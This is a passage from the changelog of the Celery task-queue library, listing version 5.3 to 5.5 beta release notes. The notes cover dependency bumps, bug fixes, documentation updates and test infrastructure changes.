(#9009)\n- Added -vv to unit, integration and smoke tests (#9014)\n- SecuritySerializer: ensure pack separator will not be conflicted with serialized fields (#9010)\n- Update sphinx-click to 5.2.2 (#9025)\n- Bump sphinx-click from 5.2.2 to 6.0.0 (#9029)\n- Fix a typo to display the help message in first-steps-with-django (#9036)\n- Pinned requests to v2.31.0 due to docker-py bug #3256 (#9039)\n- Fix certificate validity check (#9037)\n- Revert \"Pinned requests to v2.31.0 due to docker-py bug #3256\" (#9043)\n- Bump pytest from 8.2.0 to 8.2.1 (#9035)\n- Update elasticsearch requirement from <=8.13.1 to <=8.13.2 (#9045)\n- Fix detection of custom task set as class attribute with Django (#9038)\n- Update elastic-transport requirement from <=8.13.0 to <=8.13.1 (#9050)\n- Bump pycouchdb from 1.14.2 to 1.16.0 (#9052)\n- Update pytest to 8.2.2 (#9060)\n- Bump cryptography from 42.0.7 to 42.0.8 (#9061)\n- Update elasticsearch requirement from <=8.13.2 to <=8.14.0 (#9069)\n- [enhance feature] Crontab schedule: allow using month names (#9068)\n- Enhance tox environment: [testenv:clean] (#9072)\n- Clarify docs about Reserve one task at a time (#9073)\n- GCS docs fixes (#9075)\n- Use hub.remove_writer instead of hub.remove for write fds (#4185) (#9055)\n- Class method to process crontab string (#9079)\n- Fixed smoke tests env bug when using integration tasks that rely on Redis (#9090)\n- Bugfix - a task will run multiple times when chaining chains with groups (#9021)\n- Bump mypy from 1.10.0 to 1.10.1 (#9096)\n- Don't add a separator to global_keyprefix if it already has one (#9080)\n- Update pymongo[srv] requirement from <4.8,>=4.0.2 to >=4.0.2,<4.9 (#9111)\n- Added missing import in examples for Django (#9099)\n- Bump Kombu to v5.4.0rc1 (#9117)\n- Removed skipping Redis in t/smoke/tests/test_consumer.py tests (#9118)\n- Update pytest-subtests to 0.13.0 (#9120)\n- Increased smoke tests CI timeout (#9122)\n- Bump Kombu to v5.4.0rc2 (#9127)\n- Update zstandard to 0.23.0 (#9129)\n- Update pytest-subtests to 0.13.1 (#9130)\n- Changed retry to tenacity in smoke tests (#9133)\n- Bump mypy from 1.10.1 to 1.11.0 (#9135)\n- Update cryptography to 43.0.0 (#9138)\n- Update pytest to 8.3.1 (#9137)\n- Added support for Quorum Queues (#9121)\n- Bump Kombu to v5.4.0rc3 (#9139)\n- Cleanup in Changelog.rst (#9141)\n- Update Django docs for CELERY_CACHE_BACKEND (#9143)\n- Added missing docs to previous releases (#9144)\n- Fixed a few documentation build warnings (#9145)\n- docs(README): link invalid (#9148)\n- Prepare for (pre) release: v5.5.0b1 (#9146)\n\n.. _version-5.4.0:\n\n5.4.0\n=====\n\n:release-date: 2024-04-17\n:release-by: Tomer Nosrati\n\nCelery v5.4.0 and v5.3.x have consistently focused on enhancing the overall QA, both internally and externally.\nThis effort led to the new pytest-celery v1.0.0 release, developed concurrently with v5.3.0 & v5.4.0.\n\nThis release introduces two significant QA enhancements:\n\n- **Smoke Tests**: A new layer of automatic tests has been added to Celery's standard CI. These tests are designed to handle production scenarios and complex conditions efficiently. While new contributions will not be halted due to the lack of smoke tests, we will request smoke tests for advanced changes where appropriate.\n- `Standalone Bug Report Script <https://docs.celeryq.dev/projects/pytest-celery/en/latest/userguide/celery-bug-report.html>`_: The new pytest-celery plugin now allows for encapsulating a complete Celery dockerized setup within a single pytest script. Incorporating these into new bug reports will enable us to reproduce reported bugs deterministically, potentially speeding up the resolution process.\n\nContrary to the positive developments above, there have been numerous reports about issues with the Redis broker malfunctioning\nupon restarts and disconnections. Our initial attempts to resolve this were not successful (#8796).\nWith our enhanced QA capabilities, we are now prepared to address the core issue with Redis (as a broker) again.\n\nThe rest of the changes for this release are grouped below, with the changes from the latest release candidate listed at the end.\n\nChanges\n~~~~~~~\n- Add a Task class specialised for Django (#8491)\n- Add Google Cloud Storage (GCS) backend (#8868)\n- Added documentation to the smoke tests infra (#8970)\n- Added a checklist item for using pytest-celery in a bug report (#8971)\n- Bugfix: Missing id on chain (#8798)\n- Bugfix: Worker not consuming tasks after Redis broker restart (#8796)\n- Catch UnicodeDecodeError when opening corrupt beat-schedule.db (#8806)\n- chore(ci): Enhance CI with `workflow_dispatch` for targeted debugging and testing (#8826)\n- Doc: Enhance \"Testing with Celery\" section (#8955)\n- Docfix: pip install celery[sqs] -> pip install \"celery[sqs]\" (#8829)\n- Enable efficient `chord` when using dynamicdb as backend store (#8783)\n- feat(daemon): allows daemonization options to be fetched from app settings (#8553)\n- Fix DeprecationWarning: datetime.datetime.utcnow() (#8726)\n- Fix recursive result parents on group in middle of chain (#8903)\n- Fix typos and grammar (#8915)\n- Fixed version documentation tag from #8553 in configuration.rst (#8802)\n- Hotfix: Smoke tests didn't allow customizing the worker's command arguments, now it does (#8937)\n- Make custom remote control commands available in CLI (#8489)\n- Print safe_say() to stdout for non-error flows (#8919)\n- Support moto 5.0 (#8838)\n- Update contributing guide to use ssh upstream url (#8881)\n- Update optimizing.rst (#8945)\n- Updated concurrency docs page. (#8753)\n\nDependencies Updates\n~~~~~~~~~~~~~~~~~~~~\n- Bump actions/setup-python from 4 to 5 (#8701)\n- Bump codecov/codecov-action from 3 to 4 (#8831)\n- Bump isort from 5.12.0 to 5.13.2 (#8772)\n- Bump msgpack from 1.0.7 to 1.0.8 (#8885)\n- Bump mypy from 1.8.0 to 1.9.0 (#8898)\n- Bump pre-commit to 3.6.1 (#8839)\n- Bump pre-commit/action from 3.0.0 to 3.0.1 (#8835)\n- Bump pytest from 8.0.2 to 8.1.1 (#8901)\n- Bump pytest-celery to v1.0.0 (#8962)\n- Bump pytest-cov to 5.0.0 (#8924)\n- Bump pytest-order from 1.2.0 to 1.2.1 (#8941)\n- Bump pytest-subtests from 0.11.0 to 0.12.1 (#8896)\n- Bump pytest-timeout from 2.2.0 to 2.3.1 (#8894)\n- Bump python-memcached from 1.59 to 1.61 (#8776)\n- Bump sphinx-click from 4.4.0 to 5.1.0 (#8774)\n- Update cryptography to 42.0.5 (#8869)\n- Update elastic-transport requirement from <=8.12.0 to <=8.13.0 (#8933)\n- Update elasticsearch requirement from <=8.12.1 to <=8.13.0 (#8934)\n- Upgraded Sphinx from v5.3.0 to v7.x.x (#8803)\n\nChanges since 5.4.0rc2\n~~~~~~~~~~~~~~~~~~~~~~~\n- Update elastic-transport requirement from <=8.12.0 to <=8.13.0 (#8933)\n- Update elasticsearch requirement from <=8.12.1 to <=8.13.0 (#8934)\n- Hotfix: Smoke tests didn't allow customizing the worker's command arguments, now it does (#8937)\n- Bump pytest-celery to 1.0.0rc3 (#8946)\n- Update optimizing.rst (#8945)\n- Doc: Enhance \"Testing with Celery\" section (#8955)\n- Bump pytest-celery to v1.0.0 (#8962)\n- Bump pytest-order from 1.2.0 to 1.2.1 (#8941)\n- Added documentation to the smoke tests infra (#8970)\n- Added a checklist item for using pytest-celery in a bug report (#8971)\n- Added changelog for v5.4.0 (#8973)\n- Bump version: 5.4.0rc2 → 5.4.0 (#8974)\n\n.. _version-5.4.0rc2:\n\n5.4.0rc2\n========\n\n:release-date: 2024-03-27\n:release-by: Tomer Nosrati\n\n- feat(daemon): allows daemonization options to be fetched from app settings (#8553)\n- Fixed version documentation tag from #8553 in configuration.rst (#8802)\n- Upgraded Sphinx from v5.3.0 to v7.x.x (#8803)\n- Update elasticsearch requirement from <=8.11.1 to <=8.12.0 (#8810)\n- Update elastic-transport requirement from <=8.11.0 to <=8.12.0 (#8811)\n- Update cryptography to 42.0.0 (#8814)\n- Catch UnicodeDecodeError when opening corrupt beat-schedule.db (#8806)\n- Update cryptography to 42.0.1 (#8817)\n- Limit moto to <5.0.0 until the breaking issues are fixed (#8820)\n- Enable efficient `chord` when using dynamicdb as backend store (#8783)\n- Add a Task class specialised for Django (#8491)\n- Sync kombu versions in requirements and setup.cfg (#8825)\n- chore(ci): Enhance CI with `workflow_dispatch` for targeted debugging and testing (#8826)\n- Update cryptography to 42.0.2 (#8827)\n- Docfix: pip install celery[sqs] -> pip install \"celery[sqs]\" (#8829)\n- Bump pre-commit/action from 3.0.0 to 3.0.1 (#8835)\n- Support moto 5.0 (#8838)\n- Another fix for `link_error` signatures being `dict`s instead of `Signature` s (#8841)\n- Bump codecov/codecov-action from 3 to 4 (#8831)\n- Upgrade from pytest-celery v1.0.0b1 -> v1.0.0b2 (#8843)\n- Bump pytest from 7.4.4 to 8.0.0 (#8823)\n- Update pre-commit to 3.6.1 (#8839)\n- Update cryptography to 42.0.3 (#8854)\n- Bump pytest from 8.0.0 to 8.0.1 (#8855)\n- Update cryptography to 42.0.4 (#8864)\n- Update pytest to 8.0.2 (#8870)\n- Update cryptography to 42.0.5 (#8869)\n- Update elasticsearch requirement from <=8.12.0 to <=8.12.1 (#8867)\n- Eliminate consecutive chords generated by group | task upgrade (#8663)\n- Make custom remote control commands available in CLI (#8489)\n- Add Google Cloud Storage (GCS) backend (#8868)\n- Bump msgpack from 1.0.7 to 1.0.8 (#8885)\n- Update pytest to 8.1.0 (#8886)\n- Bump pytest-timeout from 2.2.0 to 2.3.1 (#8894)\n- Bump pytest-subtests from 0.11.0 to 0.12.1 (#8896)\n- Bump mypy from 1.8.0 to 1.9.0 (#8898)\n- Update pytest to 8.1.1 (#8901)\n- Update contributing guide to use ssh upstream url (#8881)\n- Fix recursive result parents on group in middle of chain (#8903)\n- Bump pytest-celery to 1.0.0b4 (#8899)\n- Adjusted smoke tests CI time limit (#8907)\n- Update pytest-rerunfailures to 14.0 (#8910)\n- Use the \"all\" extra for pytest-celery (#8911)\n- Fix typos and grammar (#8915)\n- Bump pytest-celery to 1.0.0rc1 (#8918)\n- Print safe_say() to stdout for non-error flows (#8919)\n- Update pytest-cov to 5.0.0 (#8924)\n- Bump pytest-celery to 1.0.0rc2 (#8928)\n\n.. _version-5.4.0rc1:\n\n5.4.0rc1\n========\n\n:release-date: 2024-01-17 7:00 P.M GMT+2\n:release-by: Tomer Nosrati\n\nCelery v5.4 continues our effort to provide improved stability in production\nenvironments. The release candidate version is available for testing.\nThe official release is planned for March-April 2024.\n\n- New Config: worker_enable_prefetch_count_reduction (#8581)\n- Added \"Serverless\" section to Redis doc (redis.rst) (#8640)\n- Upstash's Celery example repo link fix (#8665)\n- Update mypy version (#8679)\n- Update cryptography dependency to 41.0.7 (#8690)\n- Add type annotations to celery/utils/nodenames.py (#8667)\n- Issue 3426. Adding myself to the contributors. (#8696)\n- Bump actions/setup-python from 4 to 5 (#8701)\n- Fixed bug where chord.link_error() throws an exception on a dict type errback object (#8702)\n- Bump github/codeql-action from 2 to 3 (#8725)\n- Fixed multiprocessing integration tests not running on Mac (#8727)\n- Added make docker-docs (#8729)\n- Fix DeprecationWarning: datetime.datetime.utcnow() (#8726)\n- Remove `new` adjective in docs (#8743)\n- add type annotation to celery/utils/sysinfo.py (#8747)\n- add type annotation to celery/utils/iso8601.py (#8750)\n- Change type annotation to celery/utils/iso8601.py (#8752)\n- Update test deps (#8754)\n- Mark flaky: test_asyncresult_get_cancels_subscription() (#8757)\n- change _read_as_base64 (b64encode returns bytes) on celery/utils/term.py (#8759)\n- Replace string concatenation with fstring on celery/utils/term.py (#8760)\n- Add type annotation to celery/utils/term.py (#8755)\n- Skipping test_tasks::test_task_accepted (#8761)\n- Updated concurrency docs page. (#8753)\n- Changed pyup -> dependabot for updating dependencies (#8764)\n- Bump isort from 5.12.0 to 5.13.2 (#8772)\n- Update elasticsearch requirement from <=8.11.0 to <=8.11.1 (#8775)\n- Bump sphinx-click from 4.4.0 to 5.1.0 (#8774)\n- Bump python-memcached from 1.59 to 1.61 (#8776)\n- Update elastic-transport requirement from <=8.10.0 to <=8.11.0 (#8780)\n- python-memcached==1.61 -> python-memcached>=1.61 (#8787)\n- Remove usage of utcnow (#8791)\n- Smoke Tests (#8793)\n- Moved smoke tests to their own workflow (#8797)\n- Bugfix: Worker not consuming tasks after Redis broker restart (#8796)\n- Bugfix: Missing id on chain (#8798)\n\n.. _version-5.3.6:\n\n5.3.6\n=====\n\n:release-date: 2023-11-22  9:15 P.M GMT+6\n:release-by: Asif Saif Uddin\n\nThis release is focused mainly to fix AWS SQS new feature comatibility issue and old regressions. \nThe code changes are mostly fix for regressions. More details can be found below.\n\n- Increased docker-build CI job timeout from 30m -> 60m (#8635)\n- Incredibly minor spelling fix. (#8649)\n- Fix non-zero exit code when receiving remote shutdown (#8650)\n- Update task.py get_custom_headers missing 'compression' key (#8633)\n- Update kombu>=5.3.4 to fix SQS request compatibility with boto JSON serializer (#8646)\n- test requirements version update (#8655)\n- Update elasticsearch version (#8656)\n- Propagates more ImportErrors during autodiscovery (#8632)\n\n.. _version-5.3.5:\n\n5.3.5\n=====\n\n:release-date: 2023-11-10  7:15 P.M GMT+6\n:release-by: Asif Saif Uddin\n\n- Update test.txt versions (#8481)\n- fix os.getcwd() FileNotFoundError (#8448)\n- Fix typo in CONTRIBUTING.rst (#8494)\n- typo(doc): configuration.rst (#8484)\n- assert before raise (#8495)\n- Update GHA checkout version (#8496)\n- Fixed replaced_task_nesting (#8500)\n- Fix code indentation for route_task() example (#8502)\n- support redis 5.x (#8504)\n- Fix typos in test_canvas.py (#8498)\n- Marked flaky tests (#8508)\n- Fix typos in calling.rst (#8506)\n- Added support for replaced_task_nesting in chains (#8501)\n- Fix typos in canvas.rst (#8509)\n- Patch Version Release Checklist (#8488)\n- Added Python 3.11 support to Dockerfile (#8511)\n- Dependabot (Celery) (#8510)\n- Bump actions/checkout from 3 to 4 (#8512)\n- Update ETA example to include timezone (#8516)\n- Replaces datetime.fromisoformat with the more lenient dateutil parser (#8507)\n- Fixed indentation in Dockerfile for Python 3.11 (#8527)\n- Fix git bug in Dockerfile (#8528)\n- Tox lint upgrade from Python 3.9 to Python 3.11 (#8526)\n- Document gevent concurrency (#8520)\n- Update test.txt (#8530)\n- Celery Docker Upgrades (#8531)\n- pyupgrade upgrade v3.11.0 -> v3.13.0 (#8535)\n- Update msgpack.txt (#8548)\n- Update auth.txt (#8547)\n- Update msgpack.txt to fix build issues (#8552)\n- Basic ElasticSearch / ElasticClient 8.x Support (#8519)\n- Fix eager tasks does not populate name field (#8486)\n- Fix typo in celery.app.control (#8563)\n- Update solar.txt ephem (#8566)\n- Update test.txt pytest-timeout (#8565)\n- Correct some mypy errors (#8570)\n- Update elasticsearch.txt (#8573)\n- Update test.txt deps (#8574)\n- Update test.txt (#8590)\n- Improved the \"Next steps\" documentation (#8561). (#8600)\n- Disabled couchbase tests due to broken package breaking main (#8602)\n- Update elasticsearch deps (#8605)\n- Update cryptography==41.0.5 (#8604)\n- Update pytest==7.4.3 (#8606)\n- test initial support of python 3.12.x (#8549)\n- updated new versions to fix CI (#8607)\n- Update zstd.txt (#8609)\n- Fixed CI Support with Python 3.12 (#8611)\n- updated CI, docs and classifier for next release (#8613)\n- updated dockerfile to add python 3.12 (#8614)\n- lint,mypy,docker-unit-tests -> Python 3.12 (#8617)\n- Correct type of `request` in `task_revoked` documentation (#8616)\n- update docs docker image (#8618)\n- Fixed RecursionError caused by giving `config_from_object` nested mod… (#8619)\n- Fix: serialization error when gossip working (#6566)\n- [documentation] broker_connection_max_retries of 0 does not mean \"retry forever\" (#8626)\n- added 2 debian package for better stability in Docker (#8629)\n\n.. _version-5.3.4:\n\n5.3.4\n=====\n\n:release-date: 2023-09-03 10:10 P.M GMT+2\n:release-by: Tomer Nosrati\n\n.. warning::\n   This version has reverted the breaking changes introduced in 5.3.2 and 5.3.3:\n\n   - Revert \"store children with database backend\" (#8475)\n   - Revert \"Fix eager tasks does not populate name field\" (#8476)\n\n- Bugfix: Removed unecessary stamping code from _chord.run() (#8339)\n- User guide fix (hotfix for #1755) (#8342)\n- store children with database backend (#8338)\n- Stamping bugfix with group/chord header errback linking (#8347)\n- Use argsrepr and kwargsrepr in LOG_RECEIVED (#8301)\n- Fixing minor typo in code example in calling.rst (#8366)\n- add documents for timeout settings (#8373)\n- fix: copyright year (#8380)\n- setup.py: enable include_package_data (#8379)\n- Fix eager tasks does not populate name field (#8383)\n- Update test.txt dependencies (#8389)\n- Update auth.txt deps (#8392)\n- Fix backend.get_task_meta ignores the result_extended config parameter in mongodb backend (#8391)\n- Support preload options for shell and purge commands (#8374)\n- Implement safer ArangoDB queries (#8351)\n- integration test: cleanup worker after test case (#8361)\n- Added \"Tomer Nosrati\" to CONTRIBUTORS.txt (#8400)\n- Update README.rst (#8404)\n- Update README.rst (#8408)\n- fix(canvas): add group index when unrolling tasks (#8427)\n- fix(beat): debug statement should only log AsyncResult.id if it exists (#8428)\n- Lint fixes & pre-commit autoupdate (#8414)\n- Update auth.txt (#8435)\n- Update mypy on test.txt (#8438)\n- added missing kwargs arguments in some cli cmd (#8049)\n- Fix #8431: Set format_date to False when calling _get_result_meta on mongo backend (#8432)\n- Docs: rewrite out-of-date code (#8441)\n- Limit redis client to 4.x since 5.x fails the test suite (#8442)\n- Limit tox to < 4.9 (#8443)\n- Fixed issue: Flags broker_connection_retry_on_startup & broker_connection_retry aren’t reliable (#8446)\n- doc update from #7651 (#8451)\n- Remove tox version limit (#8464)\n- Fixed AttributeError: 'str' object has no attribute (#8463)\n- Upgraded Kombu from 5.3.1 -> 5.3.2 (#8468)\n- Document need for CELERY_ prefix on CLI env vars (#8469)\n- Use string value for CELERY_SKIP_CHECKS envvar (#8462)\n- Revert \"store children with database backend\" (#8475)\n- Revert \"Fix eager tasks does not populate name field\" (#8476)\n- Update Changelog (#8474)\n- Remove as it seems to be buggy. (#8340)\n- Revert \"Add Semgrep to CI\" (#8477)\n- Revert \"Revert \"Add Semgrep to CI\"\" (#8478)\n\n.. _version-5.3.3:\n\n5.3.3 (Yanked)\n==============\n\n:release-date: 2023-08-31 1:47 P.M GMT+2\n:release-by: Tomer Nosrati\n\n.. warning::\n   This version has been yanked due to breaking API changes. The breaking changes include:\n\n   - Store children with database backend (#8338)\n   - Fix eager tasks does not populate name field (#8383)\n\n- Fixed changelog for 5.3.2 release docs.\n\n.. _version-5.3.2:\n\n5.3.2 (Yanked)\n==============\n\n:release-date: 2023-08-31 1:30 P.M GMT+2\n:release-by: Tomer Nosrati\n\n.. warning::\n   This version has been yanked due to breaking API changes. The breaking changes include:\n\n   - Store children with database backend (#8338)\n   - Fix eager tasks does not populate name field (#8383)\n\n- Bugfix: Removed unecessary stamping code from _chord.run() (#8339)\n- User guide fix (hotfix for #1755) (#8342)\n- Store children with database backend (#8338)\n- Stamping bugfix with group/chord header errback linking (#8347)\n- Use argsrepr and kwargsrepr in LOG_RECEIVED (#8301)\n- Fixing minor typo in code example in calling.rst (#8366)\n- Add documents for timeout settings (#8373)\n- Fix: copyright year (#8380)\n- Setup.py: enable include_package_data (#8379)\n- Fix eager tasks does not populate name field (#8383)\n- Update test.txt dependencies (#8389)\n- Update auth.txt deps (#8392)\n- Fix backend.get_task_meta ignores the result_extended config parameter in mongodb backend (#8391)\n- Support preload options for shell and purge commands (#8374)\n- Implement safer ArangoDB queries (#8351)\n- Integration test: cleanup worker after test case (#8361)\n- Added \"Tomer Nosrati\" to CONTRIBUTORS.txt (#8400)\n- Update README.rst (#8404)\n- Update README.rst (#8408)\n- Fix(canvas): add group index when unrolling tasks (#8427)\n- Fix(beat): debug statement should only log AsyncResult.id if it exists (#8428)\n- Lint fixes & pre-commit autoupdate (#8414)\n- Update auth.txt (#8435)\n- Update mypy on test.txt (#8438)\n- Added missing kwargs arguments in some cli cmd (#8049)\n- Fix #8431: Set format_date to False when calling _get_result_meta on mongo backend (#8432)\n- Docs: rewrite out-of-date code (#8441)\n- Limit redis client to 4.x since 5.x fails the test suite (#8442)\n- Limit tox to < 4.9 (#8443)\n- Fixed issue: Flags broker_connection_retry_on_startup & broker_connection_retry aren’t reliable (#8446)\n- Doc update from #7651 (#8451)\n- Remove tox version limit (#8464)\n- Fixed AttributeError: 'str' object has no attribute (#8463)\n- Upgraded Kombu from 5.3.1 -> 5.3.2 (#8468)\n\n.. _version-5.3.1:\n\n5.3.1\n=====\n\n:release-date: 2023-06-18  8:15 P.M GMT+6\n:release-by: Asif Saif Uddin\n\n- Upgrade to latest pycurl release (#7069).\n- Limit librabbitmq>=2.0.0; python_version < '3.11' (#8302).\n- Added initial support for python 3.11 (#8304).\n- ChainMap observers fix (#8305).\n- Revert optimization CLI flag behaviour back to original.\n- Restrict redis 4.5.5 as it has severe bugs (#8317).\n- Tested pypy 3.10 version in CI (#8320).\n- Bump new version of kombu to 5.3.1 (#8323).\n- Fixed a small float value of retry_backoff (#8295).\n- Limit pyro4 up to python 3.10 only as it is (#8324).\n\n.. _version-5.3.0:\n\n5.3.0\n=====\n\n:release-date: 2023-06-06 12:00 P.M GMT+6\n:release-by: Asif Saif Uddin\n\n- Test kombu 5.3.0 & minor doc update (#8294).\n- Update librabbitmq.txt > 2.0.0 (#8292).\n- Upgrade syntax to py3.8 (#8281).\n\n.. _version-5.3.0rc2:\n\n5.3.0rc2\n========\n\n:release-date: 2023-05-31 9:00 P.M GMT+6\n:release-by: Asif Saif Uddin\n\n- Add missing dependency.\n- Fix exc_type being the exception instance rather.\n- Fixed revoking tasks by stamped headers (#8269).\n- Support sqlalchemy 2.0 in tests (#8271).\n- Fix docker (#8275).\n- Update redis.txt to 4.5 (#8278).\n- Update kombu>=5.3.0rc2.\n\n\n.. _version-5.3.0rc1:\n\n5.3.0rc1\n========\n\n:release-date: 2023-05-11 4:24 P.M GMT+2\n:release-by: Tomer Nosrati\n\n- fix functiom name by @cuishuang in #8087\n- Update CELERY_TASK_EAGER setting in user guide by @thebalaa in #8085\n- Stamping documentation fixes & cleanups by @Nusnus in #8092\n- switch to maintained pyro5 by @auvipy in #8093\n- udate dependencies of tests by @auvipy in #8095\n- cryptography==39.0.1 by @auvipy in #8096\n- Annotate celery/security/certificate.py by @Kludex in #7398\n- Deprecate parse_iso8601 in favor of fromisoformat by @stumpylog in #8098\n- pytest==7.2.2 by @auvipy in #8106\n- Type annotations for celery/utils/text.py by @max-muoto in #8107\n- Update web framework URLs by @sblondon in #8112\n- Fix contribution URL by @sblondon in #8111\n- Trying to clarify CERT_REQUIRED by @pamelafox in #8113\n- Fix potential AttributeError on 'stamps' by @Darkheir in #8115\n- Type annotations for celery/apps/beat.py by @max-muoto in #8108\n- Fixed bug where retrying a task loses its stamps by @Nusnus in #8120\n- Type hints for celery/schedules.py by @max-muoto in #8114\n- Reference Gopher Celery in README by @marselester in #8131\n- Update sqlalchemy.txt by @auvipy in #8136\n- azure-storage-blob 12.15.0 by @auvipy in #8137\n- test kombu 5.3.0b3 by @auvipy in #8138\n- fix: add expire string parse. by @Bidaya0 in #8134\n- Fix worker crash on un-pickleable exceptions by @youtux in #8133\n- CLI help output: avoid text rewrapping by click by @woutdenolf in #8152\n- Warn when an unnamed periodic task override another one. by @iurisilvio in #8143\n- Fix Task.handle_ignore not wrapping exceptions properly by @youtux in #8149\n- Hotfix for (#8120) - Stamping bug with retry by @Nusnus in #8158\n- Fix integration test by @youtux in #8156\n- Fixed bug in revoke_by_stamped_headers where impl did not match doc by @Nusnus in #8162\n- Align revoke and revoke_by_stamped_headers return values (terminate=True) by @Nusnus in #8163\n- Update & simplify GHA pip caching by @stumpylog in #8164\n- Update auth.txt by @auvipy in #8167\n- Update test.txt versions by @auvipy in #8173\n- remove extra = from test.txt by @auvipy in #8179\n- Update sqs.txt kombu[sqs]>=5.3.0b3 by @auvipy in #8174\n- Added signal triggered before fork by @jaroslawporada in #8177\n- Update documentation on SQLAlchemy by @max-muoto in #8188\n- Deprecate pytz and use zoneinfo by @max-muoto in #8159\n- Update dev.txt by @auvipy in #8192\n- Update test.txt by @auvipy in #8193\n- Update test-integration.txt by @auvipy in #8194\n- Update zstd.txt by @auvipy in #8195\n- Update s3.txt by @auvipy in #8196\n- Update msgpack.txt by @auvipy in #8199\n- Update solar.txt by @auvipy in #8198\n- Add Semgrep to CI by @Nusnus in #8201\n- Added semgrep to README.rst by @Nusnus in #8202\n- Update django.txt by @auvipy in #8197\n- Update redis.txt 4.3.6 by @auvipy in #8161\n- start removing codecov from pypi by @auvipy in #8206\n- Update test.txt dependencies by @auvipy in #8205\n- Improved doc for: worker_deduplicate_successful_tasks by @Nusnus in #8209\n- Renamed revoked_headers to revoked_stamps by @Nusnus in #8210\n- Ensure argument for map is JSON serializable by @candleindark in #8229\n\n.. _version-5.3.0b2:\n\n5.3.0b2\n=======\n\n:release-date: 2023-02-19 1:47 P.M GMT+2\n:release-by: Asif Saif Uddin\n\n- BLM-2: Adding unit tests to chord clone by @Nusnus in #7668\n- Fix unknown task error typo by @dcecile in #7675\n- rename redis integration test class so that tests are executed by @wochinge in #7684\n- Check certificate/private key type when loading them by @qrmt in #7680\n- Added integration test_chord_header_id_duplicated_on_rabbitmq_msg_duplication() by @Nusnus in #7692\n- New feature flag: allow_error_cb_on_chord_header - allowing setting an error callback on chord header by @Nusnus in #7712\n- Update README.rst sorting Python/Celery versions by @andrebr in #7714\n- Fixed a bug where stamping a chord body would not use the correct stamping method by @Nusnus in #7722\n- Fixed doc duplication typo for Signature.stamp() by @Nusnus in #7725\n- Fix issue 7726: variable used in finally block may not be instantiated by @woutdenolf in #7727\n- Fixed bug in chord stamping with another chord as a body + unit test by @Nusnus in #7730\n- Use \"describe_table\" not \"create_table\" to check for existence of DynamoDB table by @maxfirman in #7734\n- Enhancements for task_allow_error_cb_on_chord_header tests and docs by @Nusnus in #7744\n- Improved custom stamping visitor documentation by @Nusnus in #7745\n- Improved the coverage of test_chord_stamping_body_chord() by @Nusnus in #7748\n- billiard >= 3.6.3.0,<5.0 for rpm by @auvipy in #7764\n- Fixed memory leak with ETA tasks at connection error when worker_cancel_long_running_tasks_on_connection_loss is enabled by @Nusnus in #7771\n- Fixed bug where a chord with header of type tuple was not supported in the link_error flow for task_allow_error_cb_on_chord_header flag by @Nusnus in #7772\n- Scheduled weekly dependency update for week 38 by @pyup-bot in #7767\n- recreate_module: set spec to the new module by @skshetry in #7773\n- Override integration test config using integration-tests-config.json by @thedrow in #7778\n- Fixed error handling bugs due to upgrade to a newer version of billiard by @Nusnus in #7781\n- Do not recommend using easy_install anymore by @jugmac00 in #7789\n- GitHub Workflows security hardening by @sashashura in #7768\n- Update ambiguous acks_late doc by @Zhong-z in #7728\n- billiard >=4.0.2,<5.0 by @auvipy in #7720\n- importlib_metadata remove deprecated entry point interfaces by @woutdenolf in #7785\n- Scheduled weekly dependency update for week 41 by @pyup-bot in #7798\n- pyzmq>=22.3.0 by @auvipy in #7497\n- Remove amqp from the BACKEND_ALISES list by @Kludex in #7805\n- Replace print by logger.debug by @Kludex in #7809\n- Ignore coverage on except ImportError by @Kludex in #7812\n- Add mongodb dependencies to test.txt by @Kludex in #7810\n- Fix grammar typos on the whole project by @Kludex in #7815\n- Remove isatty wrapper function by @Kludex in #7814\n- Remove unused variable _range by @Kludex in #7813\n- Add type annotation on concurrency/threads.py by @Kludex in #7808\n- Fix linter workflow by @Kludex in #7816\n- Scheduled weekly dependency update for week 42 by @pyup-bot in #7821\n- Remove .cookiecutterrc by @Kludex in #7830\n- Remove .coveragerc file by @Kludex in #7826\n- kombu>=5.3.0b2 by @auvipy in #7834\n- Fix readthedocs build failure by @woutdenolf in #7835\n- Fixed bug in group, chord, chain stamp() method, where the visitor overrides the previously stamps in tasks of these objects by @Nusnus in #7825\n- Stabilized test_mutable_errback_called_by_chord_from_group_fail_multiple by @Nusnus in #7837\n- Use SPDX license expression in project metadata by @RazerM in #7845\n- New control command revoke_by_stamped_headers by @Nusnus in #7838\n- Clarify wording in Redis priority docs by @strugee in #7853\n- Fix non working example of using celery_worker pytest fixture by @paradox-lab in #7857\n- Removed the mandatory requirement to include stamped_headers key when implementing on_signature() by @Nusnus in #7856\n- Update serializer docs by @sondrelg in #7858\n- Remove reference to old Python version by @Kludex in #7829\n- Added on_replace() to Task to allow manipulating the replaced sig with custom changes at the end of the task.replace() by @Nusnus in #7860\n- Add clarifying information to completed_count documentation by @hankehly in #7873\n- Stabilized test_revoked_by_headers_complex_canvas by @Nusnus in #7877\n- StampingVisitor will visit the callbacks and errbacks of the signature by @Nusnus in #7867\n- Fix \"rm: no operand\" error in clean-pyc script by @hankehly in #7878\n- Add --skip-checks flag to bypass django core checks by @mudetz in #7859\n- Scheduled weekly dependency update for week 44 by @pyup-bot in #7868\n- Added two new unit tests to callback stamping by @Nusnus in #7882\n- Sphinx extension: use inspect.signature to make it Python 3.11 compatible by @mathiasertl in #7879\n- cryptography==38.0.3 by @auvipy in #7886\n- Canvas.py doc enhancement by @Nusnus in #7889\n- Fix typo by @sondrelg in #7890\n- fix typos in optional tests by @hsk17 in #7876\n- Canvas.py doc enhancement by @Nusnus in #7891\n- Fix revoke by headers tests stability by @Nusnus in #7892\n- feat: add global keyprefix for backend result keys by @kaustavb12 in #7620\n- Canvas.py doc enhancement by @Nusnus in #7897\n- fix(sec): upgrade sqlalchemy to 1.2.18 by @chncaption in #7899\n- Canvas.py doc enhancement by @Nusnus in #7902\n- Fix test warnings by @ShaheedHaque in #7906\n- Support for out-of-tree worker pool implementations by @ShaheedHaque in #7880\n- Canvas.py doc enhancement by @Nusnus in #7907\n- Use bound task in base task example. Closes #7909 by @WilliamDEdwards in #7910\n- Allow the stamping visitor itself to set the stamp value type instead of casting it to a list by @Nusnus in #7914\n- Stamping a task left the task properties dirty by @Nusnus in #7916\n- Fixed bug when chaining a chord with a group by @Nusnus in #7919\n- Fixed bug in the stamping visitor mechanism where the request was lacking the stamps in the 'stamps' property by @Nusnus in #7928\n- Fixed bug in task_accepted() where the request was not added to the requests but only to the active_requests by @Nusnus in #7929\n- Fix bug in TraceInfo._log_error() where the real exception obj was hiding behind 'ExceptionWithTraceback' by @Nusnus in #7930\n- Added integration test: 